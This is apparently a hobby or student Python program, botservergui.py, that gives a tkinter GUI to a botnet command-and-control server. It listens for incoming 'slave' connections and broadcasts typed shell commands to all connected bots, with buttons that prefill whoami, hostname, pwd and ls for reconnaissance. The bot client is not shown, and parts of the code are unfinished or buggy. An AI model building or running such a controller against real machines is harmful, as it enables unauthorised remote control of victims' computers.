#!/usr/bin/python3
# botservergui.py
import tkinter as tk
import pygubu
import socket
import sys
import os
import threading
import queue
import time
import subprocess 


q = queue.Queue()
Socketthread = []
ClientList = {}


#-------------------------------------------------------------------------------------------

class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv

    def run(self):
        BotName = threading.current_thread().getName()
        print("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
        app.insertText("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: " + BotName)
        app.on_refreshClient_client()
        ClientList[BotName] = self.client_address
        
        while True:
            RecvBotCmd = self.q.get()
            # print("\nReceived Command: " + RecvBotCmd + " for " + BotName)
            
            try:
#                RecvBotCmd += "\n"
                self.client.send(RecvBotCmd.encode('utf-8'))
                recvVal = (self.client.recv(1024)).decode('utf-8')
                print(recvVal)
            except Exception as ex:
                # for t in Socketthread:
                #     if t.is_alive() == False:
                #         print("\n[!] Died Thread: " + str(t))
                #         t.join()
                print(ex)
                break

#-------------------------------------------------------------------------------------------

class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2

    def run(self):
        

        while True:
            SendCmd = ""
            if(";" in app.getcmmd()):
                SendCmd = app.getcmmd()[:-1]
                app.clearcmmd()
            if (SendCmd == ""):
                pass
            elif (SendCmd == "exit"):
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd)
                time.sleep(5)
                os._exit(0)
            else:
                print("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots")
                app.insertText("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots")
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd)

#-------------------------------------------------------------------------------------------

def listener(lhost, lport, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(10)
    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
    app.insertText("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()    #start listening
        newthread = BotHandler(client, client_address, q) #BotHandler = Multiconn
        Socketthread.append(newthread)
        newthread.start()
#-------------------------------------------------------------------------------------------
#import
import getpass
import socket
from os import listdir
from os.path import isfile, join

def sethostport():
    try:
        #lhost = "192.168.1.118"
        lhost = "localhost"
        lport = 8080
        listener(lhost, lport, q)
    except Exception as ex:
        print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
        app.insertText("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")




class botservergui:
    
    def __init__(self):

        #1: Create a builder
        self.builder = builder = pygubu.Builder()

        #2: Load an ui file
        builder.add_from_file('botservergui.ui')

        #3: Create the mainwindow
        self.mainwindow = builder.get_object('mainwindow')
        builder.connect_callbacks(self)
        self.clientslistbox = lbox = builder.get_object('clientslistbox')

        #this here is just a test filling in clients -remove-
        lbox.select_clear(tk.END)
        for idx in ClientList:
            text = 'Client {0}'.format(idx)
            lbox.insert(tk.END, text)
        lbox.see(tk.END)
        lbox.selection_set(tk.END)
        #Hægt að nota eitthvað svipað þessu til að filla inn clients frá ClientList{} (sem er global var)
        #og setja það í einhverskonar event handler sem skynjar að það sé kominn ný tenginn og uppfærir þá listbox
        #------------------------------------------------------

    def on_load_client(self):
        lboxvar = self.builder.get_variable('clientslistvar')
        #value = lboxvar.get()
        value = self.clientslistbox.get(self.clientslistbox.curselection())
        selectedClient = self.builder.get_object('selectedClient')
        selectedClient.configure(text=value)
        textboxoutput = self.builder.get_object('textboxoutput')
        textboxoutput.delete('1.0',tk.END)
        textboxoutput.insert(tk.INSERT, "Info about client here")

    def on_pwd_clicked(self):
        command = self.builder.get_object('insertPath')
        command.insert('1.0', "pwd;")

    def getcmmd(self):
        command = self.builder.get_object('insertPath')
        return command.get("1.0",'end-1c')
    def clearcmmd(self):
        command = self.builder.get_object('insertPath')
        command.delete('1.0',tk.END)
        
    def insertText(self, txt):
        textboxoutput = self.builder.get_object('textboxoutput')
        textboxoutput.insert('1.0', txt +"\n")


        
    
    def on_refreshClient_client(self):
        box = self.builder.get_object('clientslistbox')
        box.delete(0,'end')
        for idx in ClientList:
            text = 'Client {0}' + idx
            box.insert(tk.END, text)
        box.see(tk.END)
        box.selection_set(tk.END)
    


    def on_whoami_clicked(self):
        command = self.builder.get_object('insertPath')
        command.insert('1.0', "whoami;")
        
        

    def on_host_clicked(self):
        command = self.builder.get_object('insertPath')
        command.insert('1.0', "hostname;")
        
    def on_listFiles_clicked(self):
        command = self.builder.get_object('insertPath')
        command.insert('1.0', "ls;")
        #path = self.builder.get_object('insertPath')
        #mypath = path.get("1.0",'end-1c')
        #onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]
        #text = ""
        #for x in onlyfiles:
            #text += "\n" + x + ""
        #textboxoutput = self.builder.get_object('textboxoutput')
        #textboxoutput.insert('1.0', "Files in directory:"+text+"\n" )
        

    
    def on_stop_listen(self):
        hostname = "localhost"
        port = 8080
        self.running = False
        socket.socket(socket.AF_INET, 
                  socket.SOCK_STREAM).connect( (hostname, port))
        self.socket.close()

    #make start listening button using threats so the gui dosent hang

    def on_start_listen(self):
        t = threading.Thread(target=sethostport)
        t.start()
        lbllistening = self.builder.get_object('lbllistening')
        lbllistening.configure(text="Listening on HOST:PORT")



    def run(self):
        self.mainwindow.mainloop()
        


if __name__ == '__main__':
    app = botservergui()
    app.run()
